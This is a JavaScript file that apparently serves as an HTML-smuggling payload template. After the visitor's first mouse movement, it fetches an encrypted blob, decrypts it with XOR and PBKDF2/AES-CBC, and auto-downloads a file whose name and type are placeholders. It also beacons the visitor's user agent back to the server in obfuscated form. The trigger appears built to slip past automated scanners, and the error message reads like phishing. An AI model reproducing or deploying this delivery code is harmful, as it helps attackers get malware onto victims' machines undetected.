function xorBuffer(buffer, key){
    var output = new Uint8Array(buffer.length);
    for(var i = 0; i < buffer.length; ++i){
        output[i] = buffer[i] ^ key.charCodeAt(i % key.length);
    }
    return output;
}

function base64ToArrayBuffer(base64) {
    var binary_string = window.atob(base64);
    var len = binary_string.length;

    var bytes = new Uint8Array(len);
    for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
    return bytes;
}

async function decryptfile(kek) {
    var mydec = base64ToArrayBuffer(kek);
    var cipherbytes = xorBuffer(mydec, "__XOR_KEY__") 

    var pbkdf2iterations=10000;
    var passphrasebytes=new TextEncoder("utf-8").encode("__ENCRYPTION_KEY__");
    var pbkdf2salt=cipherbytes.slice(8,16);


    var passphrasekey=await window.crypto.subtle.importKey('raw', passphrasebytes, {name: 'PBKDF2'}, false, ['deriveBits'])
    .catch(function(err){
        console.error(err);

    });

    var pbkdf2bytes=await window.crypto.subtle.deriveBits({"name": 'PBKDF2', "salt": pbkdf2salt, "iterations": pbkdf2iterations, "hash": 'SHA-256'}, passphrasekey, 384)        
    .catch(function(err){
        console.error(err);
    });
    pbkdf2bytes=new Uint8Array(pbkdf2bytes);

    keybytes=pbkdf2bytes.slice(0,32);
    ivbytes=pbkdf2bytes.slice(32);
    cipherbytes=cipherbytes.slice(16);

    var key=await window.crypto.subtle.importKey('raw', keybytes, {name: 'AES-CBC', length: 256}, false, ['decrypt']) 
    .catch(function(err){
        console.error(err);
    });

    var plaintextbytes=await window.crypto.subtle.decrypt({name: "AES-CBC", iv: ivbytes}, key, cipherbytes)
    .catch(function(err){
        console.error(err);
    });

    if(!plaintextbytes) {
        var asdf = document.getElementById("pq")
        asdf.innerHTML='<p style="font-size:70%;color:red;">Error retrieving file. Please contact the sender.</p>';
        return;
    }

    plaintextbytes=new Uint8Array(plaintextbytes);

    var blob=new Blob([plaintextbytes], {type: '__CONTENT_TYPE__'});
    var blobUrl=URL.createObjectURL(blob);

    aDecfile.href=blobUrl;
    aDecfile.download="__FILE_NAME__";
    aDecfile.click();
}

function n(t, e) {
    if (200 === t.status) {
        var r = t.response.substring(f, t.response.length - w);

        decryptfile(r)
        e(r)
    }
}

function r(t) {
    document.getElementById("prr").hidden = !0;
    var e = new XMLHttpRequest;
    e.open("GET", "data?auth_key=" + encodeURIComponent(btoa(s(p, t))), !0), e.send()
}

function s(t, e) {
    for (var r = "", n = 0; n < e.length; n++) {
        var o = e.charCodeAt(n),
            a = t.charCodeAt(n % t.length);
        r += String.fromCharCode(o ^ a)
    }
    return r
}

function e() {
    var t = new XMLHttpRequest;
    t.open("GET", "data.html", !0), t.responseType = "text", t.onload = n.bind(void 0, t, function(t) {
        r(window.navigator.userAgent)
    }), t.send()
}

function DoSomething() {
  var done = false;
  window.onmousemove = function(z){
    if (!done) {
      e();
      done = true;    
    }
  } 
}

var f = "<!DOCTYPE html><html><body>".length,
    p = "__XOR_KEY__",
    w = "</body></html>".length;